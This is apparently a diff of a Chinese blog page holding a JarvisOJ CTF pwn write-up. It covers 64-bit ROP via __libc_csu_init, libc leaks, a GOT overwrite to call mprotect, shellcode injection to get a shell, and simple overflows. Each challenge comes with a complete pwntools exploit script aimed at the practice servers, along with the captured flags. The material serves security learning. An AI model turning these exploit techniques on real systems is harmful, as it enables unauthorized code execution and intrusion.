-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-43-47.jpg" alt=""><br>
-现在我们可以知道，mmap的作用就是<strong>将文件态的部分映射到程序的虚拟空间中</strong>(程序虚拟空间指的是程序可见的地址，包括已分配和可以被分配的两部分内存，即我们操作系统里面所说的程序可占有4G大小的虚拟内存)，然后通过设<code>mmap</code>的参数<code>flags</code>和<code>port</code>就可以控制映射到虚拟空间中的内存的执行、读写权限以及是否修改源文件，是否共享或者私有(用到咱们学的<code>copy-on-write</code>技术，即写时拷贝，每个程序试图修改时才会产生一个拷贝副本)，是否锁定（不允许页置换）等属性。还不理解可以结合in nek大佬在知乎上对<code>mmap</code>函数的解释来理解。<a href="https://www.zhihu.com/question/48161206" target="_blank" rel="noopener">知乎- Linux 中 mmap() 函数的内存映射问题理解？-in nek 的回答</a><br>
-总得来说，mmap对于我们的作用就是在程序虚拟空间产生一段可读写、可执行的内存段，对于是哪个文件映射过来我们并不关心，但是为了避免我们在内存段中写入ShellCode回写至被映射的文件而产生莫名的错误，我建议选择<code>MAP_PRIVATE</code>即修改时会产生一个内存副本，而不会修改被映射的文件内容。而第五个参数是被映射文件的文件描述符<code>fd</code>，我们知道平常我们得到的文件描述符是由<code>fopen</code>这类函数的返回值得到的，默认的0是<code>stdin</code>,1是<code>stdout</code>。由于我们并不想知道也并不关心哪个文件或者区域被映射到内存中所以我建议使用匿名映射–<code>MAP_ANONYMOUS</code>。如上秒描述的一样，当<code>MAP_ANONYMOUS</code>时，文件描述符<code>fd</code>会被置为<code>-1</code>被无视掉，更为贴切我们不在乎谁被映射的要求。<br>
-先写一个C程序把<code>flags</code>属性对应的值输出来看一下<br>
-<img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-39-45.jpg" alt=""><br>
-接下来我们就是要构造这样的函数调用</p>
-<pre class="highlight"><code class="C"><span class="comment">//原型</span>
-<span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">( <span class="keyword">void</span> *start , <span class="keyword">size_t</span> length , <span class="keyword">int</span> prot , <span class="keyword">int</span> flags , <span class="keyword">int</span> fd , <span class="keyword">off_t</span> offsize)</span>
-<span class="comment">//构造函数调用</span>
-<span class="title">mmap</span><span class="params">(segment_addr , <span class="number">0x1000</span> , <span class="number">0x111</span> ,<span class="number">32</span>+<span class="number">2</span> ,<span class="number">-1</span> , <span class="number">0</span> )</span>
-</span></code></pre>
-<p>但是最主要的问题是mmap需要6个参数，而这个程序是64bit的。所以很难找到这样的一个gadget能够控制<code>rdi rsi rdx rcx r8 r9</code>这六个寄存器的。所以我们采用参数更少的<code>mprotect</code>函数<br>
-PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的是<code>_dl_runtime_resolve</code>函数。详见蒸米的文章<a href="http://www.vuln.cn/6643" target="_blank" rel="noopener">一步一步学ROP之gadgets和2free篇 - 蒸米</a>。32bit的程序则不存在这种问题。<br>
-函数<code>_dl_runtime_resolve</code>在这题的链接库<code>ld.2.19.so</code>版本中是存在的，而在我本地是<code>ld.2.26.so</code>，并不存在<code>_dl_runtime_resolve</code>，取而代之的是<code>_dl_runtime_resolve_avx_slow</code>，所以这个gadget还受目标系统so文件版本的影响。故不推荐在64bit程序下使用<code>mmap</code>函数<br>
-<code>ld.2.19.so</code>下载地址: <a href="https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html" target="_blank" rel="noopener">https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html</a></p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-43-47.jpg" alt=""><br>现在我们可以知道，mmap的作用就是<strong>将文件态的部分映射到程序的虚拟空间中</strong>(程序虚拟空间指的是程序可见的地址，包括已分配和可以被分配的两部分内存，即我们操作系统里面所说的程序可占有4G大小的虚拟内存)，然后通过设<code>mmap</code>的参数<code>flags</code>和<code>port</code>就可以控制映射到虚拟空间中的内存的执行、读写权限以及是否修改源文件，是否共享或者私有(用到咱们学的<code>copy-on-write</code>技术，即写时拷贝，每个程序试图修改时才会产生一个拷贝副本)，是否锁定（不允许页置换）等属性。还不理解可以结合in nek大佬在知乎上对<code>mmap</code>函数的解释来理解。<a href="https://www.zhihu.com/question/48161206" target="_blank" rel="noopener">知乎- Linux 中 mmap() 函数的内存映射问题理解？-in nek 的回答</a><br>总得来说，mmap对于我们的作用就是在程序虚拟空间产生一段可读写、可执行的内存段，对于是哪个文件映射过来我们并不关心，但是为了避免我们在内存段中写入ShellCode回写至被映射的文件而产生莫名的错误，我建议选择<code>MAP_PRIVATE</code>即修改时会产生一个内存副本，而不会修改被映射的文件内容。而第五个参数是被映射文件的文件描述符<code>fd</code>，我们知道平常我们得到的文件描述符是由<code>fopen</code>这类函数的返回值得到的，默认的0是<code>stdin</code>,1是<code>stdout</code>。由于我们并不想知道也并不关心哪个文件或者区域被映射到内存中所以我建议使用匿名映射—<code>MAP_ANONYMOUS</code>。如上秒描述的一样，当<code>MAP_ANONYMOUS</code>时，文件描述符<code>fd</code>会被置为<code>-1</code>被无视掉，更为贴切我们不在乎谁被映射的要求。<br>先写一个C程序把<code>flags</code>属性对应的值输出来看一下<br><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/14-39-45.jpg" alt=""><br>接下来我们就是要构造这样的函数调用</p>
+<pre><code class="lang-C">//原型
+void *mmap( void *start , size_t length , int prot , int flags , int fd , off_t offsize)
+//构造函数调用
+mmap(segment_addr , 0x1000 , 0x111 ,32+2 ,-1 , 0 )
+</code></pre>
+<p>但是最主要的问题是mmap需要6个参数，而这个程序是64bit的。所以很难找到这样的一个gadget能够控制<code>rdi rsi rdx rcx r8 r9</code>这六个寄存器的。所以我们采用参数更少的<code>mprotect</code>函数<br>PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的是<code>_dl_runtime_resolve</code>函数。详见蒸米的文章<a href="http://www.vuln.cn/6643" target="_blank" rel="noopener">一步一步学ROP之gadgets和2free篇 - 蒸米</a>。32bit的程序则不存在这种问题。<br>函数<code>_dl_runtime_resolve</code>在这题的链接库<code>ld.2.19.so</code>版本中是存在的，而在我本地是<code>ld.2.26.so</code>，并不存在<code>_dl_runtime_resolve</code>，取而代之的是<code>_dl_runtime_resolve_avx_slow</code>，所以这个gadget还受目标系统so文件版本的影响。故不推荐在64bit程序下使用<code>mmap</code>函数<br><code>ld.2.19.so</code>下载地址: <a href="https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html" target="_blank" rel="noopener">https://opensuse.pkgs.org/42.1/opensuse-update-oss/glibc-2.19-22.1.x86_64.rpm.html</a></p>
 <hr>
-<h2 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h2>
-<blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
 <ol>
 <li>利用<code>write</code>函数泄露内存地址，配合DynELF寻找libc加载基址</li>
 <li>通过基址和偏移，计算出<code>mprotect</code>和<code>read</code>函数的地址</li>
@@ -512,342 +437,285 @@ PS :当然，寻找控制6个参数的gadget的方法是存在的，可利用的
 </ol>
 </blockquote>
 <p>poc:</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-libc = ELF(<span class="string">"./libc-2.19.so"</span>)
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9884</span>)
-<span class="comment">#context.log_level = 'debug'</span>
-context.arch = <span class="string">'amd64'</span>
-elf = ELF(<span class="string">"./level3_x64"</span>)
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
+<pre><code class="lang-python">from pwn import * 
+libc = ELF(&quot;./libc-2.19.so&quot;)
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9884)
+#context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&quot;./level3_x64&quot;)
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
 
-rdi_ret_addr = <span class="number">0x4006b3</span>
-vulnerable_addr = <span class="number">0x40062E</span>
+rdi_ret_addr = 0x4006b3
+vulnerable_addr = 0x40062E
 data_addr = elf.bss()
-<span class="comment">#__libc_csu_init 通用gadget</span>
-init_gadget1 = <span class="number">0x4006AA</span>
-init_gadget2 = <span class="number">0x400690</span>
-<span class="comment">#__libc_csu_init 通用gadget构造一个可循环利用的call函数，前提是需要知道got地址，且got地址对应的数据是真实内存地址</span>
-<span class="comment">#看不懂为什么这么构造的可以看我上一篇文章《百度杯11月pwnme》倒数第二段代码处的注释解释有__libc_csu_init 通用gadget的利用</span>
-<span class="function"><span class="keyword">def</span> <span class="title">_call</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span>
-	Data = <span class="string">""</span>
-	payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-	payload += p64(init_gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(func_got)+p64(arg3)+p64(arg2)+p64(arg1)
-	payload += p64(init_gadget2)+p64(<span class="number">0x1</span>)*<span class="number">7</span>
-	payload += p64(vulnerable_addr)
-	respone(<span class="string">"Input:\n"</span>,payload)
-	<span class="keyword">if</span> returnData:
-		Data = u64(pro.recv(<span class="number">8</span>))
-	<span class="keyword">return</span> Data
+#__libc_csu_init 通用gadget
+init_gadget1 = 0x4006AA
+init_gadget2 = 0x400690
+#__libc_csu_init 通用gadget构造一个可循环利用的call函数，前提是需要知道got地址，且got地址对应的数据是真实内存地址
+#看不懂为什么这么构造的可以看我上一篇文章《百度杯11月pwnme》倒数第二段代码处的注释解释有__libc_csu_init 通用gadget的利用
+def _call(func_got,arg1,arg2,arg3,returnData=False):
+    Data = &quot;&quot;
+    payload = &quot;A&quot;*0x88
+    payload += p64(init_gadget1)+p64(0)+p64(1)+p64(func_got)+p64(arg3)+p64(arg2)+p64(arg1)
+    payload += p64(init_gadget2)+p64(0x1)*7
+    payload += p64(vulnerable_addr)
+    respone(&quot;Input:\n&quot;,payload)
+    if returnData:
+        Data = u64(pro.recv(8))
+    return Data
 
-read_addr = _call(elf.got[<span class="string">'write'</span>],<span class="number">1</span>,elf.got[<span class="string">'read'</span>],<span class="number">8</span>,<span class="keyword">True</span>)<span class="comment">#读出read的真实内存地址</span>
-log.info(<span class="string">'read_addr:%s'</span>,hex(read_addr))
-imageBase = read_addr - libc.symbols[<span class="string">'read'</span>]<span class="comment">#计算imageBase</span>
-mprotect_addr = imageBase + libc.symbols[<span class="string">'mprotect'</span>]<span class="comment">#mprotect内存地址</span>
+read_addr = _call(elf.got[&#39;write&#39;],1,elf.got[&#39;read&#39;],8,True)#读出read的真实内存地址
+log.info(&#39;read_addr:%s&#39;,hex(read_addr))
+imageBase = read_addr - libc.symbols[&#39;read&#39;]#计算imageBase
+mprotect_addr = imageBase + libc.symbols[&#39;mprotect&#39;]#mprotect内存地址
 
-shell = asm(shellcraft.amd64.sh())<span class="comment">#利用pwntools的shellcraft生成64位shellcode</span>
-log.info(<span class="string">'Writing Shell Code....'</span>)
-_call(elf.got[<span class="string">'read'</span>],<span class="number">0</span>,data_addr,len(shell))<span class="comment">#调用read函数将ShellCode写入bss段</span>
+shell = asm(shellcraft.amd64.sh())#利用pwntools的shellcraft生成64位shellcode
+log.info(&#39;Writing Shell Code....&#39;)
+_call(elf.got[&#39;read&#39;],0,data_addr,len(shell))#调用read函数将ShellCode写入bss段
 pro.send(shell)
-log.info(<span class="string">'Done!'</span>)
+log.info(&#39;Done!&#39;)
 
-log.info(<span class="string">'Hijacking __libc_start_main Address....'</span>)
-_call(elf.got[<span class="string">'read'</span>],<span class="number">0</span>,elf.got[<span class="string">'__libc_start_main'</span>],<span class="number">8</span>)<span class="comment">#修改__libc_start_main的got表地址成为我们mprotect地址</span>
+log.info(&#39;Hijacking __libc_start_main Address....&#39;)
+_call(elf.got[&#39;read&#39;],0,elf.got[&#39;__libc_start_main&#39;],8)#修改__libc_start_main的got表地址成为我们mprotect地址
 pro.send(p64(mprotect_addr))
-log.info(<span class="string">'Done!'</span>)
+log.info(&#39;Done!&#39;)
 
-log.info(<span class="string">'Calling mprotect....'</span>)
-_call(elf.got[<span class="string">'__libc_start_main'</span>],<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">7</span>)<span class="comment">#调用__libc_start_main函数，其实是调用mprotect函数，修改内存段成为可读写可执行的权限</span>
-log.info(<span class="string">'Done!'</span>)
+log.info(&#39;Calling mprotect....&#39;)
+_call(elf.got[&#39;__libc_start_main&#39;],0x00600000,0x1000,7)#调用__libc_start_main函数，其实是调用mprotect函数，修改内存段成为可读写可执行的权限
+log.info(&#39;Done!&#39;)
 
-log.info(<span class="string">'Geting shell...'</span>)
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-payload += p64(data_addr)<span class="comment">#调用ShellCode</span>
-respone(<span class="string">"Input:\n"</span>,payload)
+log.info(&#39;Geting shell...&#39;)
+payload = &quot;A&quot;*0x88
+payload += p64(data_addr)#调用ShellCode
+respone(&quot;Input:\n&quot;,payload)
 pro.interactive()
 </code></pre>
 <p><strong>Flag : CTF{9c3a234bd804292b153e7a1c25da648c}</strong></p>
-<h1 id="level-6"><a class="markdownIt-Anchor" href="#level-6"></a> level 6</h1>
-<p><em>正在努力学习堆利用，待我学成之日。。。再另开一片文章详细解释对利用以及补充此题</em></p>
-<h1 id="level-2-x64"><a class="markdownIt-Anchor" href="#level-2-x64"></a> level 2 x64</h1>
-<p>与32位的level2一致，给了<code>system</code>函数以及<code>/bin/sh</code>字符串。<br>
-由于32位是栈上传参和64位是先由寄存器<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>rcx</code>,<code>r8</code>,<code>r9</code>传递前6位参数，再多的参数就丢栈上传递<br>
-所以我们需要找到一些<code>gadget</code>帮助我们传递<code>/bin/sh</code>进<code>rdi</code><br>
-之前的文章已经教了如何寻找<code>gadget</code>，此处我们直接用<code>ROPgadget</code>工具寻找</p>
-<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-38-15.jpg" alt=""><br>
-万事俱备，poc如下:</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./level2_x64")</span>
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9882</span>)
-context.log_level = <span class="string">'debug'</span>
+<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p><em>正在努力学习堆利用，待我学成之日。。。再另开一片文章详细解释对利用以及补充此题</em></p>
+<h1 id="level-2-x64"><a href="#level-2-x64" class="headerlink" title="level 2 x64"></a>level 2 x64</h1><p>与32位的level2一致，给了<code>system</code>函数以及<code>/bin/sh</code>字符串。<br>由于32位是栈上传参和64位是先由寄存器<code>rdi</code>,<code>rsi</code>,<code>rdx</code>,<code>rcx</code>,<code>r8</code>,<code>r9</code>传递前6位参数，再多的参数就丢栈上传递<br>所以我们需要找到一些<code>gadget</code>帮助我们传递<code>/bin/sh</code>进<code>rdi</code><br>之前的文章已经教了如何寻找<code>gadget</code>，此处我们直接用<code>ROPgadget</code>工具寻找</p>
+<p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-38-15.jpg" alt=""><br>万事俱备，poc如下:</p>
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./level2_x64&quot;)
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9882)
+context.log_level = &#39;debug&#39;
 
-elf = ELF(<span class="string">"./level2_x64"</span>)
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-pop_rdi_ret_addr = <span class="number">0x4006b3</span>
-bin_sh_addr = <span class="number">0x600A90</span>
-system_addr = <span class="number">0x40063E</span>
+elf = ELF(&quot;./level2_x64&quot;)
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
+pop_rdi_ret_addr = 0x4006b3
+bin_sh_addr = 0x600A90
+system_addr = 0x40063E
 
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
+payload = &quot;A&quot;*0x88
 payload += p64(pop_rdi_ret_addr)+p64(bin_sh_addr)
 payload += p64(system_addr)
-respone(<span class="string">"Input:\n"</span>,payload)
+respone(&quot;Input:\n&quot;,payload)
 pro.interactive()
 </code></pre>
 <p><strong>Flag: CTF{081ecc7c8d658409eb43358dcc1cf446}</strong></p>
-<h1 id="level-3-x64"><a class="markdownIt-Anchor" href="#level-3-x64"></a> level 3 x64</h1>
-<p>与32位的level3也差不多，给了<code>libc</code>，给了溢出点，然后思路还是一样，就是要寻找<code>gadget</code>这点不同</p>
+<h1 id="level-3-x64"><a href="#level-3-x64" class="headerlink" title="level 3 x64"></a>level 3 x64</h1><p>与32位的level3也差不多，给了<code>libc</code>，给了溢出点，然后思路还是一样，就是要寻找<code>gadget</code>这点不同</p>
 <ol>
 <li>用<code>write</code>函数泄露出<code>write</code>的真实内存地址(通过泄露got表中对应的write条目实现)</li>
 <li>然后利用<code>write</code>函数真实内存地址减去给的<code>libc</code>中<code>write</code>函数的偏移得到<code>imageBase</code></li>
 <li>最后<code>imageBase</code>加上<code>libc</code>中<code>system</code>的偏移就是真实内存地址了，<code>/bin/sh</code>地址同理。</li>
-<li>构造ROP执行<code>system</code><br>
-本题我使用的是通用<code>gadget</code>函数<code>_libc_csu_init()</code>,该函数是用gcc编译的时候自带的，所以很通用。如何利用<code>_libc_csu_init()</code>函数构造ROP上文以及上一篇文章已经说过了，就不再赘述了</li>
+<li>构造ROP执行<code>system</code><br>本题我使用的是通用<code>gadget</code>函数<code>_libc_csu_init()</code>,该函数是用gcc编译的时候自带的，所以很通用。如何利用<code>_libc_csu_init()</code>函数构造ROP上文以及上一篇文章已经说过了，就不再赘述了</li>
 </ol>
 <p>poc:</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./level3_x64")</span>
-libc = ELF(<span class="string">"./libc-2.19.so"</span>)
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9883</span>)
-context.log_level = <span class="string">'debug'</span>
-elf = ELF(<span class="string">"./level3_x64"</span>)
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./level3_x64&quot;)
+libc = ELF(&quot;./libc-2.19.so&quot;)
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9883)
+context.log_level = &#39;debug&#39;
+elf = ELF(&quot;./level3_x64&quot;)
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
 
-rdi_ret_addr = <span class="number">0x4006b3</span>
-vulnerable_addr = <span class="number">0x40062E</span>
-init_gadget1 = <span class="number">0x4006AA</span>
-init_gadget2 = <span class="number">0x400690</span>
+rdi_ret_addr = 0x4006b3
+vulnerable_addr = 0x40062E
+init_gadget1 = 0x4006AA
+init_gadget2 = 0x400690
 
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
-payload += p64(init_gadget1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(elf.got[<span class="string">'write'</span>])+p64(<span class="number">8</span>)+p64(elf.got[<span class="string">'write'</span>])+p64(<span class="number">1</span>)<span class="comment">#调用write泄露write真是内存地址</span>
-payload += p64(init_gadget2)+p64(<span class="number">0x1</span>)*<span class="number">7</span>
-payload += p64(vulnerable_addr)<span class="comment">#重新回到漏洞函数处</span>
-respone(<span class="string">"Input:\n"</span>,payload)
+payload = &quot;A&quot;*0x88
+payload += p64(init_gadget1)+p64(0)+p64(1)+p64(elf.got[&#39;write&#39;])+p64(8)+p64(elf.got[&#39;write&#39;])+p64(1)#调用write泄露write真是内存地址
+payload += p64(init_gadget2)+p64(0x1)*7
+payload += p64(vulnerable_addr)#重新回到漏洞函数处
+respone(&quot;Input:\n&quot;,payload)
 
-data = u64(pro.recv(<span class="number">8</span>))
-<span class="comment">#计算基址以及函数地址</span>
-imageBase = data - libc.symbols[<span class="string">'write'</span>]
-system_addr = imageBase + libc.symbols[<span class="string">'system'</span>]
-bin_sh_addr = imageBase + next(libc.search(<span class="string">'/bin/sh'</span>))
-<span class="comment">#起shell</span>
-payload = <span class="string">"A"</span>*<span class="number">0x88</span>
+data = u64(pro.recv(8))
+#计算基址以及函数地址
+imageBase = data - libc.symbols[&#39;write&#39;]
+system_addr = imageBase + libc.symbols[&#39;system&#39;]
+bin_sh_addr = imageBase + next(libc.search(&#39;/bin/sh&#39;))
+#起shell
+payload = &quot;A&quot;*0x88
 payload += p64(rdi_ret_addr)+p64(bin_sh_addr)+p64(system_addr)
-respone(<span class="string">"Input:\n"</span>,payload)
+respone(&quot;Input:\n&quot;,payload)
 pro.interactive()
 </code></pre>
 <p><strong>Flag: CTF{b1aeaa97fdcc4122533290b73765e4fd}</strong></p>
-<h1 id="test-your-memory"><a class="markdownIt-Anchor" href="#test-your-memory"></a> Test Your Memory</h1>
-<p>直接上IDA</p>
-<pre class="highlight"><code class="C"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">mem_test</span><span class="params">(<span class="keyword">char</span> *s2)</span>
-</span>{
-  <span class="keyword">int</span> result; <span class="comment">// eax@2</span>
-  <span class="keyword">char</span> s; <span class="comment">// [sp+15h] [bp-13h]@1</span>
+<h1 id="Test-Your-Memory"><a href="#Test-Your-Memory" class="headerlink" title="Test Your Memory"></a>Test Your Memory</h1><p>直接上IDA</p>
+<pre><code class="lang-C">int __cdecl mem_test(char *s2)
+{
+  int result; // eax@2
+  char s; // [sp+15h] [bp-13h]@1
 
-  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">11u</span>);
-  <span class="built_in">puts</span>(<span class="string">"\nwhat???? : "</span>);
-  <span class="built_in">printf</span>(<span class="string">"0x%x \n"</span>, hint);
-  <span class="built_in">puts</span>(<span class="string">"cff flag go go go ...\n"</span>);
-  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);
-  __isoc99_scanf(<span class="string">"%s"</span>, &amp;s);<span class="comment">//溢出点</span>
-    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, s2, <span class="number">4u</span>) )
-    result = <span class="built_in">puts</span>(<span class="string">"good job!!\n"</span>);
-  <span class="keyword">else</span>
-    result = <span class="built_in">puts</span>(<span class="string">"cff flag is failed!!\n"</span>);
-  <span class="keyword">return</span> result;
+  memset(&amp;s, 0, 11u);
+  puts(&quot;\nwhat???? : &quot;);
+  printf(&quot;0x%x \n&quot;, hint);
+  puts(&quot;cff flag go go go ...\n&quot;);
+  printf(&quot;&gt; &quot;);
+  __isoc99_scanf(&quot;%s&quot;, &amp;s);//溢出点
+    if ( !strncmp(&amp;s, s2, 4u) )
+    result = puts(&quot;good job!!\n&quot;);
+  else
+    result = puts(&quot;cff flag is failed!!\n&quot;);
+  return result;
 }
 </code></pre>
-<p>问题出在<code>mem_test()</code>函数的<code>scanf</code>上，查看栈结构很容易知道溢出填充长度为<code>23</code>。<br>
-此外还有一个<code>win_func()</code>函数和一个<code>catFlag</code>只读数据</p>
+<p>问题出在<code>mem_test()</code>函数的<code>scanf</code>上，查看栈结构很容易知道溢出填充长度为<code>23</code>。<br>此外还有一个<code>win_func()</code>函数和一个<code>catFlag</code>只读数据</p>
 <p><img src="/2018/02/05/JarvisOJ-PWN-Writeup专题/00-56-31.jpg" alt=""></p>
-<pre class="highlight"><code class="C"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">win_func</span><span class="params">(<span class="keyword">char</span> *command)</span>
-</span>{
-  <span class="keyword">return</span> system(command);
+<pre><code class="lang-C">int __cdecl win_func(char *command)
+{
+  return system(command);
 }
 </code></pre>
-<p>所以思路就很简单了。<br>
-溢出跳过<code>win_func()</code>，然后栈上传个<code>catFlag</code>就好了</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./memory") </span>
-pro = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="number">9876</span>)
-context.log_level = <span class="string">'debug'</span>
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-payload = <span class="string">"A"</span>*<span class="number">23</span>
-payload +=p32(<span class="number">0x80485BD</span>)
-payload +=p32(<span class="number">0x80487E0</span>)+p32(<span class="number">0x80487E0</span>)
-respone(<span class="string">"&gt; "</span>,payload)
+<p>所以思路就很简单了。<br>溢出跳过<code>win_func()</code>，然后栈上传个<code>catFlag</code>就好了</p>
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./memory&quot;) 
+pro = remote(&quot;pwn2.jarvisoj.com&quot;, 9876)
+context.log_level = &#39;debug&#39;
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
+payload = &quot;A&quot;*23
+payload +=p32(0x80485BD)
+payload +=p32(0x80487E0)+p32(0x80487E0)
+respone(&quot;&gt; &quot;,payload)
 pro.interactive()
 </code></pre>
 <p><strong>Flag: CTF{332e294fb7aeeaf0e1c7703a29304343}</strong></p>
-<h1 id="tell-me-something"><a class="markdownIt-Anchor" href="#tell-me-something"></a> Tell me something</h1>
-<p>很简单的一题，一个溢出点一个<code>cat Flag</code>函数，不赘述</p>
-<pre class="highlight"><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> * 
-<span class="comment">#pro = process("./guestbook")</span>
-pro = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="number">9876</span>)
-context.log_level = <span class="string">'debug'</span>
-<span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf,send_buf,new_line=True)</span>:</span>
-	pro.recvuntil(recv_buf)
-	<span class="keyword">if</span> new_line:
-		pro.sendline(send_buf)
-	<span class="keyword">else</span>:
-		pro.send(send_buf)
-payload = <span class="string">"A"</span>*<span class="number">136</span>
-payload += p64(<span class="number">0x400620</span>)
-respone(<span class="string">"Input your message:\n"</span>,payload)
-<span class="keyword">print</span> pro.recv(<span class="number">500</span>)
+<h1 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell me something"></a>Tell me something</h1><p>很简单的一题，一个溢出点一个<code>cat Flag</code>函数，不赘述</p>
+<pre><code class="lang-python">from pwn import * 
+#pro = process(&quot;./guestbook&quot;)
+pro = remote(&quot;pwn.jarvisoj.com&quot;, 9876)
+context.log_level = &#39;debug&#39;
+def respone(recv_buf,send_buf,new_line=True):
+    pro.recvuntil(recv_buf)
+    if new_line:
+        pro.sendline(send_buf)
+    else:
+        pro.send(send_buf)
+payload = &quot;A&quot;*136
+payload += p64(0x400620)
+respone(&quot;Input your message:\n&quot;,payload)
+print pro.recv(500)
 </code></pre>
 <p><strong>Flag: PCTF{This_is_J4st_Begin}</strong></p>
-<h1 id="smashes"><a class="markdownIt-Anchor" href="#smashes"></a> Smashes</h1>
-<p>首先分析一下程序：</p>
-<pre class="highlight"><code class="C"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span>
-</span>{
-  __int64 v3; <span class="comment">// rax@1</span>
-  __int64 v4; <span class="comment">// rbx@2</span>
-  <span class="keyword">int</span> v5; <span class="comment">// eax@3</span>
-  __int64 v8; <span class="comment">// [sp+0h] [bp-128h]@1</span>
-  __int64 v9; <span class="comment">// [sp+108h] [bp-20h]@1</span>
+<h1 id="Smashes"><a href="#Smashes" class="headerlink" title="Smashes"></a>Smashes</h1><p>首先分析一下程序：</p>
+<pre><code class="lang-C">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v3; // rax@1
+  __int64 v4; // rbx@2
+  int v5; // eax@3
+  __int64 v8; // [sp+0h] [bp-128h]@1
+  __int64 v9; // [sp+108h] [bp-20h]@1
 
-  v9 = *MK_FP(__FS__, <span class="number">40L</span>L);
-  __printf_chk(<span class="number">1L</span>L, <span class="number">0x400934</span>LL);                <span class="comment">// print "Hello!\nWhat's your name?"</span>
-  LODWORD(v3) = _IO_gets(&amp;v8);                  <span class="comment">// Read</span>
-  <span class="keyword">if</span> ( !v3 )
+  v9 = *MK_FP(__FS__, 40LL);
+  __printf_chk(1LL, 0x400934LL);                // print &quot;Hello!\nWhat&#39;s your name?&quot;
+  LODWORD(v3) = _IO_gets(&amp;v8);                  // Read
+  if ( !v3 )
 LABEL_9:
-    _exit(<span class="number">1</span>);
